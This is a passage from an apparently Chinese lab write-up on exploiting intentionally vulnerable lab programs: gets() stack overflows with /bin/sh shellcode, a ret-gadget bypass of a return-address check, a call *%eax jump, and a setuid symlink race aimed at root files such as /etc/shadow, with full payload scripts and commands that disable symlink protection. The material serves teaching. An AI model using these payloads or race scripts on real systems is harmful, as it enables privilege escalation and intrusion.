class="type">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">64</span>];</span><br><span class="line">    <span class="built_in">gets</span>(buffer);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序定义了一个64字节大小的buffer数组，然后使用gets获取输入数据，我们知道gets是不安全的函数，这里会引发缓冲区溢出，栈上函数的返回地址可以被改写，我们可以输入Shellcode来覆盖栈上的数据，然后通过改写函数返回地址为Shellcode的起始地址来达到执行Shellcode的目的。</p><h2 id="执行Shell-Code"><a href="#执行Shell-Code" class="headerlink" title="执行Shell Code"></a>执行Shell Code</h2><p>使用gdb调试，查看主函数反汇编</p><p><img src="/.io//image-20240209182818286.png" alt="image-20240209182818286"></p><p>在程序入口和gets函数下断点，查看程序入口esp和调用前eax的值。前者是栈底返回地址处，后者是传入的参数，即buffer</p><p><img src="/.io//image-20240209183335160.png" alt="image-20240209183335160"></p><p>0xffffd6cc - 0xffffd680，那么这两个地址的差为76，如下图下图所示：</p><p><img src="/.io//image-20240209183403937.png" alt="image-20240209183403937"></p><p>也就是说，在覆盖了76字节数据后，如果再覆盖4个字节，就可以把返回地址覆盖为我们想要的地址了。在返回地址数据之后，我们使用Shellcode来覆盖栈上的内容。从上图中可以看出，Shellcode的起始地址应为0xffffd6cc+4 &#x3D; 0xffffd6d0。</p><p>在gdb调试器下调试pwn6程序时，只要合理控制输入数据的第77~80字节的内容，就可以实现对函数返回地址进行覆盖，我们可以将返回地址填充为0xffffd6d0来实现执行Shellcode的目的。我们对输入数据的构造的布局如下：</p><p><img src="/.io//image-20240209183500620.png" alt="image-20240209183500620"></p><p>创建一个python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">shellcode = (<span class="string">&quot;\xeb\x12\x31\xc9\x5e\x56\x5f\xb1\x15\x8a\x06\xfe&quot;</span> +</span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;\xc8\x88\x06\x46\xe2\xf7\xff\xe7\xe8\xe9\xff\xff&quot;</span> +</span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;\xff\x32\xc1\x32\xca\x52\x69\x30\x74\x69\x01\x69&quot;</span> +</span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;\x30\x63\x6a\x6f\x8a\xe4\xb1\x0c\xce\x81&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;A&#x27;</span>*<span class="number">76</span> + <span class="string">&#x27;\xd0\xd6\xff\xff&#x27;</span> + shellcode</span><br></pre></td></tr></table></figure><p>在Shell下执行python pwn6.py &gt; test将输出数据写入test文件，然后再次使用gdb调试pwn6程序，gdb载入pwn6程序后，执行r &lt; test命令，表示将test文件的数据当做输入数据传给pwn6程序，可以看到Shellcode成功执行，新创建了一个&#x2F;bin&#x2F;bash进程：</p><p><img src="/.io//image-20240209183748476.png" alt="image-20240209183748476"></p><p>理论上来说，在shell中执行.&#x2F;pwn6 &lt; test也是可以成功溢出的，但是由于在gdb下和实际情况下栈的基地址不一样，因此实际上在shell中执行.&#x2F;pwn6 &lt; test会提示Segmentation fault。</p><h1 id="绕过返回地址限制"><a href="#绕过返回地址限制" class="headerlink" title="绕过返回地址限制"></a>绕过返回地址限制</h1><h2 id="背景-6"><a href="#背景-6" class="headerlink" title="背景"></a>背景</h2><p>_builtin_return_address函数接收一个参数，可以是0,1,2等。__builtin_return_address(0)返回当前函数的返回地址，如果参数增大1，那么就往上走一层获取主调函数的返回地址。</p><p>retn指令从栈顶弹出一个数据并赋值给EIP寄存器，程序继续执行时就相当于跳转到这个地址去执行代码了。<strong>如果我们将返回地址覆盖为一条retn指令的地址</strong>，那么就又可以执行一条retn指令了，相当于再在栈顶弹出一个数据赋值给EIP寄存器。</p><p>主机&#x2F;home&#x2F;test&#x2F;7目录下有一个pwn7程序，执行这个程序可以输入数据进行测试，正常情况下程序接收输入数据后会产生对应的输出信息并直接退出，然而当输入一定的数据量时，可能会提示bzzzt的错误信息，当输入的精心构造的输入数据时可对程序发起溢出攻击，达到执行Shellcode的目的。下面这段Shellcode用于执行&#x2F;bin&#x2F;bash：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\xeb\x12\x31\xc9\x5e\x56\x5f\xb1\x15\x8a\x06\xfe\xc8\x88\x06\x46\xe2\xf7\xff\xe7\xe8\xe9\xff\xff\xff\x32\xc1\x32\xca\x52\x69\x30\x74\x69\x01\x69\x30\x63\x6a\x6f\x8a\xe4\xb1\x0c\xce\x81</span><br></pre></td></tr></table></figure><p>直接覆盖返回地址跳转到Shellcode执行是不行的，程序对返回地址进行了一点限制，绕过对返回地址的保护限制，以达到执行特定Shellcode的目的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">getpath</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">64</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> ret;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;input path please: &quot;</span>);</span><br><span class="line">    <span class="built_in">fflush</span>(stdout);</span><br><span class="line">    <span class="built_in">gets</span>(buffer);</span><br><span class="line">    ret = __builtin_return_address(<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ((ret &amp; <span class="number">0xbf000000</span>) == <span class="number">0xbf000000</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bzzzt (%p)\n&quot;</span>, ret);</span><br><span class="line">        _exit(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;got path %s\n&quot;</span>, buffer);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">getpath</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>getpath函数中定义了一个64字节大小的buffer数组，然后使用gets获取输入数据，我们知道gets是不安全的函数，这里会引发缓冲区溢出，栈上函数的返回地址可以被改写。但是也可以看到这里对返回地址和0xbf000000进行与操作，如果高位字节是0xbf的话，那么程序就会退出。</p><h2 id="多层跳转绕过返回地址限制"><a href="#多层跳转绕过返回地址限制" class="headerlink" title="多层跳转绕过返回地址限制"></a>多层跳转绕过返回地址限制</h2><p>使用gdb调试并查看主函数反汇编</p><p><img src="/.io//image-20240209185105463.png" alt="image-20240209185105463"></p><p>对感兴趣的区域下上断点，观察返回地址和buffer地址</p><p><img src="/.io//image-20240209185226279.png" alt="image-20240209185226279"></p><p>有：0xffffd6bc - 0xffffd66c，那么这两个地址的差为80。</p><p>也就是说，在覆盖了80字节数据后，如果再覆盖4个字节，就可以把返回地址覆盖为我们想要的地址了。现在因为对返回地址进行了限制，我们显然不能直接跳转到栈上执行代码，因为这里Shellcode的地址的最高字节为0xff，有0xff &amp; 0xbf &#x3D;&#x3D; 0xbf，因此无法通过保护限制。</p><p>这里采用两次跳转的方法来突破这个限制。</p><p>我们可以将一条retn指令的地址来覆盖函数的返回地址，比如getpath的最后一条指令为：</p><p>0x080484e9 &lt;+117&gt;:  ret</p><p>那么，0x080484e9 &amp; 0xbf000000 &#x3D; 0x08000000，可以绕过保护限制，我们让这条retn指令执行时，从栈上取到的数据为Shellcode的地址，就可以执行Shellcode了。那么，我们构造的输入数据应该是这样的：</p><p><img src="/.io//image-20240209185354775.png" alt="image-20240209185354775"></p><p>通过上面的步骤我们已经知道，在gdb调试器下调试pwn7程序时，只要合理控制输入数据的第81~84字节的内容，就可以实现对函数返回地址进行覆盖，我们可以将返回地址填充为0x080484e9来实现执行一条retn指令。</p><p>同时，我们将第85~88字节覆盖为Shellcode的地址。即0xffffd6bc+4+4 &#x3D; 0xffffd6c4，我们对输入数据的构造的布局如下：</p><p><img src="/.io//image-20240209185659543.png" alt="image-20240209185659543"></p><p>在&#x2F;home&#x2F;test&#x2F;7目录下有一个pwn7.py的Python脚本，其源代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">shellcode = (<span class="string">&quot;\xeb\x12\x31\xc9\x5e\x56\x5f\xb1\x15\x8a\x06\xfe&quot;</span> +</span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;\xc8\x88\x06\x46\xe2\xf7\xff\xe7\xe8\xe9\xff\xff&quot;</span> +</span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;\xff\x32\xc1\x32\xca\x52\x69\x30\x74\x69\x01\x69&quot;</span> +</span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;\x30\x63\x6a\x6f\x8a\xe4\xb1\x0c\xce\x81&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;A&#x27;</span>*<span class="number">80</span> + <span class="string">&#x27;\xe9\x84\x04\x08&#x27;</span> + <span class="string">&#x27;\xc4\xd6\xff\xff&#x27;</span>  + shellcode</span><br></pre></td></tr></table></figure><p>在Shell下执行python pwn7.py &gt; test将输出数据写入test文件，然后再次使用gdb调试pwn7程序，gdb载入pwn7程序后，执行r &lt; test命令，表示将test文件的数据当做输入数据传给pwn7程序，可以看到Shellcode成功执行，新创建了一个&#x2F;bin&#x2F;bash进程：</p><p><img src="/.io//image-20240209185827796.png" alt="image-20240209185827796"></p><h1 id="通用跳转技术"><a href="#通用跳转技术" class="headerlink" title="通用跳转技术"></a>通用跳转技术</h1><p><strong>strdup</strong>可以用于复制一个字符串，我们通常使用字符串时会使用<strong>strcpy</strong>，这要求已经定义好了一个接收缓冲区。而<strong>strdup</strong>只接受一个参数，也就是要复制的字符串的地址，strdup()会先用maolloc()配置与参数字符串相同大小的的空间，然后将参数字符串的内容复制到该内存地址，然后把该地址返回。strdup返回的地址最后可以利用free()来释放。</p><p>当输出信息非常多的时候，我们很难快速找到我们感兴趣的信息。使用grep命令可以对匹配特定正则表达式的文本进行搜索，并只输出匹配的行或文本。</p><p>我们可以使用管道将一个程序的输出当做grep的输入数据，grep会根据给定的正则表达式参数对输入数据进行过滤。</p><p>对于grep的参数需要注意这样一个问题：当参数中存在空格时需要用双引号将参数包裹起来，此外，* 是正则表达式里面的通配符，如果要查找 <em>，需要使用反斜杠进行转移，即 \ </em>。</p><p>主机&#x2F;home&#x2F;test&#x2F;8目录下有一个pwn8程序，执行这个程序可以输入数据进行测试，正常情况下程序接收输入数据后会产生对应的输出信息并直接退出，然而当输入一定的数据量时，可能会提示<strong>bzzzt</strong>的错误信息，当输入的精心构造的输入数据时可对程序发起溢出攻击，达到执行Shellcode的目的。下面这段Shellcode用于执行&#x2F;bin&#x2F;sh：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x89\x46\x0c\x88\x46\x07\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh</span><br></pre></td></tr></table></figure><p> 除了绕过对返回地址的限制保护之外，还可以使用更加高级的通用跳转技术来执行Shellcode。</p><p>源代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">char</span>* <span class="title">getpath</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">64</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> ret;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;input path please:&quot;</span>);</span><br><span class="line">    <span class="built_in">fflush</span>(stdout);</span><br><span class="line">    <span class="built_in">gets</span>(buffer);</span><br><span class="line">    ret = __builtin_return_address(<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ((ret &amp; <span class="number">0xb0000000</span>) == <span class="number">0xb0000000</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bzzzt (%p)\n&quot;</span>, ret);</span><br><span class="line">       _exit(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;got path %s\n&quot;</span>, buffer);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strdup</span>(buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">getpath</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>getpath函数中定义了一个64字节大小的buffer数组，然后使用gets获取输入数据，我们知道gets是不安全的函数，这里会引发缓冲区溢出。在程序的末尾调用了strdup对buffer缓冲区中存储的字符串进行复制，并返回了新的缓冲区副本的地址。</p><h2 id="通用跳转技术-1"><a href="#通用跳转技术-1" class="headerlink" title="通用跳转技术"></a>通用跳转技术</h2><p>使用gdb调试pwn8</p><p><img src="/.io//image-20240209191209389.png" alt="image-20240209191209389"></p><p>下断点，获取返回地址和eax地址</p><p><img src="/.io//image-20240209191306099.png" alt="image-20240209191306099"></p><p>上图中红色线条框起来的就是我们执行的gdb命令，粉红色线条框起来的是我们下断点的地址，蓝色线条框起来的是我们想要查看的两个寄存器的值，有：</p><p>0xffffd6bc - 0xffffd66c，那么这两个地址的差为80。</p><p>   也就是说，在覆盖了80字节数据后，如果再覆盖4个字节，就可以把返回地址覆盖为我们想要的地址了。</p><p>   现在关注一下函数末尾的几条汇编指令，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x08048518 &lt;+116&gt;:  lea  -0x4c(%ebp),%eax</span><br><span class="line"></span><br><span class="line">0x0804851b &lt;+119&gt;:  mov  %eax,(%esp)</span><br><span class="line"></span><br><span class="line">0x0804851e &lt;+122&gt;:  call  0x80483d8 &lt;strdup@plt&gt;</span><br><span class="line"></span><br><span class="line">0x08048523 &lt;+127&gt;:  leave</span><br><span class="line"></span><br><span class="line">0x08048524 &lt;+128&gt;:  ret</span><br></pre></td></tr></table></figure><p>   我们发现程序调用了strdup对输入数据进行复制，然后把新分配的空间的地址返回。在汇编语言中，函数的返回值存储于eax寄存器中，可以在gdb中实际验证一下：</p><p><img src="/.io//image-20240209191345882.png" alt="image-20240209191345882"></p><p>在0x08048523下一个断点，然后输入c继续执行，输入数据后，断点将会断下，这时候通过执行x &#x2F;s $eax命令，看到了我们复制的数据。既然eax寄存器指向复制后的buffer，如果我们将函数的返回地址覆盖为call *%eax这样的指令的地址，那么Shellcode就可以被执行了。可以尝试找到这样的一条指令。</p><p>我们知道通过objdump -d pwn8可以查看pwn8中的汇编指令，而grep可以对指令进行过滤，那么可以在Shell中执行objdump -d pwn8 | grep “call **%eax”来找到我们需要的指令：</p><p><img src="/.io//image-20240209204942339.png" alt="image-20240209204942339"></p><p>通过上面的步骤我们已经知道，可以将getpath函数的返回地址覆盖为0x0804849f，就可以执行call *%eax了。这里我们需要将Shellcode布局到buffer的最前面，shellcode与返回地址之间不足的数据可以用A来填充，我们对输入数据的构造的布局如下：</p><p><img src="/.io//image-20240209204953377.png" alt="image-20240209204953377"></p><p>编写python脚本，填充</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">shellcode = (<span class="string">&quot;\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x89\x46\x0c\x88\x46&quot;</span> +</span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;\x07\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80&quot;</span> +</span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">junk = (<span class="number">80</span>-<span class="built_in">len</span>(shellcode))*<span class="string">&#x27;A&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> shellcode + junk + <span class="string">&#x27;\x9f\x84\x04\x08&#x27;</span></span><br></pre></td></tr></table></figure><p>在Shell下执行python pwn8.py &gt; test将输出数据写入test文件，然后再次使用gdb调试pwn8程序，gdb载入pwn8程序后，执行r &lt; test命令，表示将test文件的数据当做输入数据传给pwn8程序，可以看到Shellcode成功执行，新创建了一个&#x2F;bin&#x2F;bash进程：</p><p><img src="/.io//image-20240209205220669.png" alt="image-20240209205220669"></p><h1 id="竟态条件漏洞"><a href="#竟态条件漏洞" class="headerlink" title="竟态条件漏洞"></a>竟态条件漏洞</h1><h2 id="背景-7"><a href="#背景-7" class="headerlink" title="背景"></a>背景</h2><p>竞态条件（race condition），从多进程间通信的角度来讲，是指两个或多个进程对共享的数据进行读或写的操作时，最终的结果取决于这些进程的执行顺序。</p><p>在ubuntu的11.04或者12.04版本默认配置已经开启了对竞态条件漏洞的保护策略。这个保护策略严格限制了在什么情况下可以去跟踪操作一个符号链接指向的文件。帮助文档中对这个策略是这么描述的：“在所有人都可写的目录（比如说&#x2F;tmp目录）中存在的符号链接，被链接的文件与目录与符号链接的创建者不同时，被链接的文件不可以被操作”。简单举例来帮助大家理解一下：在&#x2F;tmp目录下有一个软连接&#x2F;tmp&#x2F;abc指向&#x2F;etc&#x2F;shadow，而这个软连接是test用户（uid为1000）的用户创建。那么，任何情况下都无法通过这个软连接来修改&#x2F;etc&#x2F;shadow文件。</p><p>  如果实验在ubuntu12.04版本进行，则需要关掉这个防护功能。以下两种方法都可以关闭此配置。</p><p>  1)$ sudo sysctl -w kernel.yama.protected_sticky_symlinks&#x3D;0</p><p>  2)$ sudo echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;fs&#x2F;protected_symlinks</p><p>  本次实验在ubuntu 16.04环境下进行，命令为</p><p>  $ sudo sysctl -w fs.protected_symlinks&#x3D;0</p><p>一个看起来很正常的程序但是却存在竞态条件漏洞的程序，源码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*  vulp.c  */</span> </span><br><span class="line"></span><br><span class="line">  <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">      <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> * fn = <span class="string">&quot;/tmp/XYZ&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> buffer[<span class="number">60</span>];</span><br><span class="line"></span><br><span class="line">  FILE *fp;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  <span class="comment">/* get user input */</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%50s&quot;</span>, buffer );</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!<span class="built_in">access</span>(fn, W_OK))&#123;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  fp = <span class="built_in">fopen</span>(fn, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fwrite</span>(<span class="string">&quot;\n&quot;</span>, <span class="built_in">sizeof</span>(<span class="type">char</span>), <span class="number">1</span>, fp);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fwrite</span>(buffer, <span class="built_in">sizeof</span>(<span class="type">char</span>), <span class="built_in">strlen</span>(buffer), fp);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fclose</span>(fp);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;No permission \n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这个程序是一个set-uid程序（文件属主是root），这个程序的功能是将用户的输入，追加到&#x2F;tmp&#x2F;XYZ这个文件。因为程序是拥有root权限，因此在写入操作之前，我们看到程序使用了access函数来检查是否对&#x2F;tmp&#x2F;XYZ文件拥有写入的权限。access()函数用来检查执行程序的用户是否拥有对&#x2F;tmp&#x2F;XYZ文件的写入权限。</p><p>这个过程看起来很完美，用户拥有写入权限时，执行写入操作，用户没有写入权限时不执行操作。然而这个代码的流程却存在竞态条件漏洞。我们假设这样一种情况，&#x2F;tmp&#x2F;XYZ是个软连接，原本指向&#x2F;home&#x2F;test&#x2F;race&#x2F;testfile（文件属主是test用户）,然而access()函数的执行与fopen()函数的执行之间，时间间隔非常长，当test用户运行此程序且access()函数执行之后，&#x2F;tmp&#x2F;XYZ软连接文件被test用户修改，指向了&#x2F;etc&#x2F;shadow（属主是root，其他用户无权限修改）。那么fopen()函数的对象，则变成了&#x2F;etc&#x2F;shadow，攻击者可以成功的向&#x2F;etc&#x2F;shadow文件追加任意内容（程序本身是setuid程序，可以修改&#x2F;etc&#x2F;shadow）。</p><p>这个漏洞从理论上是存在的，然而，我们知道access()和fopen()之间的时间间隔非常短，如何成功的利用这个竞态条件漏洞呢？由于我们使用普通用户，无法修改vulp程序的代码，所以只能变换思路，多次执行vulp程序，并且反复修改&#x2F;tmp&#x2F;XYZ文件的软连接指向的文件。</p><h2 id="利用竟态条件漏洞"><a href="#利用竟态条件漏洞" class="headerlink" title="利用竟态条件漏洞"></a>利用竟态条件漏洞</h2><p>利用此漏洞，我们可以达到下面2种效果：</p><p>1.向任意属主为root的文件追加内容</p><p>2.获取root权限</p><p>在&#x2F;home&#x2F;test&#x2F;race&#x2F;目录下有一个文件rootfile，属主是root。</p><p>  要利用这个漏洞，有这么几个要素：</p><p>  1.&#x2F;tmp&#x2F;XYZ软连接指向的文件不停在属主test和root用户之间切换。</p><p>  2.漏洞程序要反复多次执行。</p><p>  3.漏洞被利用一次之后程序要停止，以免多次写入。</p><p>  对于要素1，我们可以写一个简单的程序，attack.c和testfile</p><p>attack.c：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">          <span class="built_in">system</span>(<span class="string">&quot;ln -sf /home/test/race/testfile /tmp/XYZ&quot;</span>);</span><br><span class="line">          <span class="built_in">system</span>(<span class="string">&quot;ln -sf /home/test/race/rootfile /tmp/XYZ&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>从代码中，我们可以看到，attack这个程序修改&#x2F;tmp&#x2F;XYZ这个软连接所指向的目标文件在testfile和rootfile之间来回切换。</p><p>对于要素三，我们可以写一个脚本来实现确保写入一次。因为写入一次之后，文件的时间戳会改变，因为我们通过检测rootfile的时间戳来判断是否写入成功。脚本check.sh代码如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">  old=`<span class="built_in">ls</span> -l /home/test/race/rootfile`</span><br><span class="line">  new=`<span class="built_in">ls</span> -l /home/test/race/rootfile`</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> [ <span class="string">&quot;<span class="variable">$old</span>&quot;</span> = <span class="string">&quot;<span class="variable">$new</span>&quot;</span> ]</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">      ./vulp &lt; contents_to_append</span><br><span class="line">      new=`<span class="built_in">ls</span> -l /home/test/race/rootfile`</span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line">  </span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;STOP... The root file has been changed&quot;</span></span><br></pre></td></tr></table></figure><p>从上面代码中我们可以发现，要素二也满足了，我们通过.&#x2F;vulp &lt; contents_to_append来反复执行vulp程序，并且通过重定向来向程序输入我们要追加的内容。</p><p>至此，我们完成攻击所需要的准备步骤都完成了，看一下&#x2F;home&#x2F;test&#x2F;race目录都有哪些文件：</p><p><img src="/.io//image-20240209211251740.png" 